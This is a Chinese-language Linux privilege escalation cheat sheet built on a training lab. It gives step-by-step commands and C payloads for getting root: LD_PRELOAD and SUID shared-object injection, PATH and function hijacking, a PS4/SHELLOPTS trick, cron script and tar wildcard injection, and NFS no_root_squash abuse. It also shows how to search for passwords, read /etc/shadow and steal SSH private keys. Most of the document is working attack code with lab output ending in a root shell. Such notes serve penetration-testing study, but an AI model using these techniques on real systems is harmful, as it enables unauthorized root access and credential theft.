# 1. 内核提权

自动化内核提权枚举脚本
* LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester

# 2. 配置文件里存储的密码信息
就是记录在配置文件里的密码信息，这个在linpeas里会有枚举

# 3. 记录在bash历史记录里的密码信息

查找bash记录里是否有密码：
```cat ~/.bash_history | grep -i passw```

# 4. 敏感文件的弱权限

查看shadow文件权限，如果是可读即有可能爆破用户密码
> ls -la /etc/shadow

# 5. 查找ssh私钥

查找方法1：
> find / -name authorized_keys 2> /dev/null

查找方法2：
> find / -name id_rsa 2> /dev/null

如果找到了私钥文件，复制到本地，保存为id_rsa

赋权：
> chmod 400 id_rsa

连接ssh：
> ssh -i id_rsa <用户名>@<ip>

# 6. Sudo (Shell Escaping)

```sudo -l```列出本账号所有可以用root（或者其他用户）权限执行的命令或者脚本

# 7. sudo（滥用预期功能 (Abusing Intended Functionality)）

sudo -l查看
```
TCM@debian:/home$ sudo -l
Matching Defaults entries for TCM on this host:
    env_reset, env_keep+=LD_PRELOAD

User TCM may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/apache2
```

利用apache2查看shadow里面的文件内容
>sudo apache2 -f /etc/shadow

# 8. Sudo (LD_PRELOAD)

sudo -l查看
```
TCM@debian:/home$ sudo -l
Matching Defaults entries for TCM on this host:
    env_reset, env_keep+=LD_PRELOAD

```

留意```LD_PRELOAD```这个环境变量

>LD_PRELOAD是Linux系统的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。

## 如何利用？

### 1. 把下面代码保存成文件x.c
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

### 2. 编译成一个动态链接库

> gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles

### 3. 连接上面的动态链接库，执行一个sudo -l下出现的命令，提权到root

> sudo LD_PRELOAD=/tmp/x.so apache2

# 9. SUID(共享对象注入)

总的思路就是查找到有缺失共享动态库文件的SUID（需要满足目标路径可写），我们自定义这个动态链接库，把提权代码写在里面。当执行SUID时会调用这个动态链接库，提权代码就被执行了，我们拿到root权限。

## 如何利用？

### 1.查找所有SUID
> find / -type f -perm -04000 -ls 2>/dev/null

```
TCM@debian:/tmp$ find / -type f -perm -04000 -ls 2>/dev/null
809081   40 -rwsr-xr-x   1 root     root        37552 Feb 15  2011 /usr/bin/chsh
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudo
810173   36 -rwsr-xr-x   1 root     root        32808 Feb 15  2011 /usr/bin/newgrp
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudoedit
809080   44 -rwsr-xr-x   1 root     root        43280 Jun 18  2020 /usr/bin/passwd
809078   64 -rwsr-xr-x   1 root     root        60208 Feb 15  2011 /usr/bin/gpasswd
809077   40 -rwsr-xr-x   1 root     root        39856 Feb 15  2011 /usr/bin/chfn
816078   12 -rwsr-sr-x   1 root     staff        9861 May 14  2017 /usr/local/bin/suid-so
816762    8 -rwsr-sr-x   1 root     staff        6883 May 14  2017 /usr/local/bin/suid-env
816764    8 -rwsr-sr-x   1 root     staff        6899 May 14  2017 /usr/local/bin/suid-env2
815723  948 -rwsr-xr-x   1 root     root       963691 May 13  2017 /usr/sbin/exim-4.84-3
832517    8 -rwsr-xr-x   1 root     root         6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
832743  212 -rwsr-xr-x   1 root     root       212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
812623   12 -rwsr-xr-x   1 root     root        10592 Feb 15  2016 /usr/lib/pt_chown
473324   36 -rwsr-xr-x   1 root     root        36640 Oct 14  2010 /bin/ping6
473323   36 -rwsr-xr-x   1 root     root        34248 Oct 14  2010 /bin/ping
473292   84 -rwsr-xr-x   1 root     root        78616 Jan 25  2011 /bin/mount
473312   36 -rwsr-xr-x   1 root     root        34024 Feb 15  2011 /bin/su
473290   60 -rwsr-xr-x   1 root     root        53648 Jan 25  2011 /bin/umount
465223  100 -rwsr-xr-x   1 root     root        94992 Dec 13  2014 /sbin/mount.nfs

```

### 2.选择```/usr/local/bin/suid-so```这个SUID文件，追踪它的动态库调用：

> strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"

```
TCM@debian:/tmp$ strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY)      = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libdl.so.2", O_RDONLY)       = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libm.so.6", O_RDONLY)        = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libc.so.6", O_RDONLY)        = 3
open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)

```

发现缺少```/home/user/.config/libcalc.so```这个动态链接库

### 3.创建对应的文件夹

> mkdir /home/user/.config

### 4.把下面c代码保存到上面的文件夹中,保存成动态链接库的c文件

```
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

### 5.编译成动态链接库

> gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c

```
TCM@debian:~/.config$ gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
TCM@debian:~/.config$ ls
libcalc.c  libcalc.so

```

### 6.执行SUID文件，提权到root
```
TCM@debian:~/.config$ /usr/local/bin/suid-so
Calculating something, please wait...
bash-4.1# id
uid=1000(TCM) gid=1000(user) euid=0(root) egid=50(staff) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
bash-4.1# whoami
root
```

# 10. SUID (Symlinks)

这个提权需要满足：
> 1. sudo是SUID
> 2. nginx版本低于1.6.2-5+deb8u3

依赖攻击脚本：[nginxed-root.sh](https://github.com/xl7dev/Exploit/blob/master/Nginx/nginxed-root.sh)
CVE序列号：CVE-2016-1247

初始shell是：```www-data```

执行攻击：
>/nginxed-root.sh /var/log/nginx/error.log

等一段时间，提权到root

# 11. SUID（环境变量 #1）

这个属于路径+SUID提权。

## 如何利用？

### 1.查找所有SUID
> find / -type f -perm -04000 -ls 2>/dev/null

```
TCM@debian:/tmp$ find / -type f -perm -04000 -ls 2>/dev/null
816762    8 -rwsr-sr-x   1 root     staff        6883 May 14  2017 /usr/local/bin/suid-env
```

### 2.strings命令查看suid-env

```
TCM@debian:/tmp$ strings /usr/local/bin/suid-env
/lib64/ld-linux-x86-64.so.2
5q;Xq
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
service apache2 start
```

留意```service apache2 start```，执行了一个service命令，我们可以通过修改$PATH的方式劫持这个service命令

### 3.把/tmp/添加到$PATH
> export PATH=/tmp:$PATH

### 4.创建一个同名的c文件
```
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
```

### 5.编译到新建的$PATH下
>  gcc /tmp/service.c -o /tmp/service

### 6.执行SUID,提权到root
>  /usr/local/bin/suid-env

# 12. SUID (Environment Variables #2)

我的理解这也是一种命令劫持

## 如何利用？

Exploitation Method #1

### 1.查找所有SUID
> find / -type f -perm -04000 -ls 2>/dev/null

```
TCM@debian:/tmp$ find / -type f -perm -04000 -ls 2>/dev/null
816764    8 -rwsr-sr-x   1 root     staff        6899 May 14  2017 /usr/local/bin/suid-env2
```

### 2.strings命令查看suid-env2
```
TCM@debian:/tmp$ strings /usr/local/bin/suid-env2
/lib64/ld-linux-x86-64.so.2
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
/usr/sbin/service apache2 start

```

留意```/usr/sbin/service apache2 start```这条shell，使用了```/usr/sbin/service```命令，注意这里是带路径的

### 3. 重新定义同名的函数,把提权的shell写在函数里面
> function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }

### 4. 设置```/usr/sbin/service```为仅使用函数名称
> export -f /usr/sbin/service

man export对于 -f的解释是：```Use function names only.```

### 5. 执行SUID,提权到root
> /usr/local/bin/suid-env2


Exploitation Method #2

>env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'


# 13.Capabilities(能力)

列出已启用的功能
> getcap -r / 2>/dev/null

注意这个值：```cap_setuid```

根据显示的功能到[gtfobins](https://gtfobins.github.io/)查找对应的```Capabilities```的提权方法

# 14. Cron(Path) 

思路主要是把提权命令注入到Cron脚本中

查看Cron任务：
> cat /etc/crontab

```
TCM@debian:/tmp$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh

```

执行：
> echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh

执行：
> chmod +x /home/user/overwrite.sh

执行：
> /tmp/bash -p

# 15.Cron (通配符)

这个条件要满足：
1. Cron任务使用了tar命令
2. 使用了通配符“*”


查看overwrite.sh脚本
```
TCM@debian:~$ cat /usr/local/bin/compress.sh
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *

```

依次执行：
```
TCM@debian:~$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
TCM@debian:~$ touch /home/user/--checkpoint=1
TCM@debian:~$ touch /home/user/--checkpoint-action=exec=sh\ runme.sh

```

当Cron触发时，实际上等同于执行：

> tar -zcf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh runme.sh 

# 16.Cron (文件覆盖)

这个思路跟14有点像，就是把提权命令追加到Cron脚本当中，前提是Cron脚本是可写的

检查权限,发现可写：
```
TCM@debian:~$ ls -l /usr/local/bin/overwrite.sh
-rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh
```

追加提权命令到Cron脚本中：
> echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh

等待一分钟任务执行，执行提权：
> /tmp/bash -p

# 17.NFS

## 思路
1. NFS（网络文件共享）配置保存在 ```/etc/exports``` 文件中。该文件是在 NFS 服务器安装期间创建的，通常可以由用户读取
查看：
> cat  /etc/exports

2. 关键元素是可以在上面看到的```no_root_squash```选项
3. 默认情况下，NFS 会将 root 用户更改为 nfsnobody 并剥夺任何文件以 root 权限运行。如果“no_root_squash”选项存在于可写共享中，我们可以创建一个设置了 SUID 位的可执行文件并在目标系统上运行它.

简单点来说就是因为靶机的错误分享配置，导致攻击机挂载上去以后创建的任何文件都能够以root的身份和权限运行。

## 步骤
1. 在靶机查看 ```/etc/exports```
> cat /etc/exports

2. 检查上面分享文件是否存在```no_root_squash```选项

3. 在攻击机查看靶机的分享目录
> showmount -e 靶机IP

4. 在攻击机```/tmp/```目录下创建一个文件夹
> mkdir /tmp/expnfs

5. 把靶机有```no_root_squash```选项的文件夹挂载到攻击机上
> mount -o rw 靶机IP：/靶机共享文件夹  /tmp/expnfs  
> 例子：mount -o rw 10.0.2.12:/backups  /tmp/expnfs)

6. 创建一个c程序，把如下代码写进去。
```
int main(){
setgid(0);
setuid(0);
system("/bin/bash");
return 0;
}

```

7. 在攻击机挂载目录上编译上面的c程序
```
gcc nfs.x -o nfs -w
```

8. 此时回到靶机的分享目录，就可以看见上面的nfs二进制文件，并且具有SUID权限，执行即可提权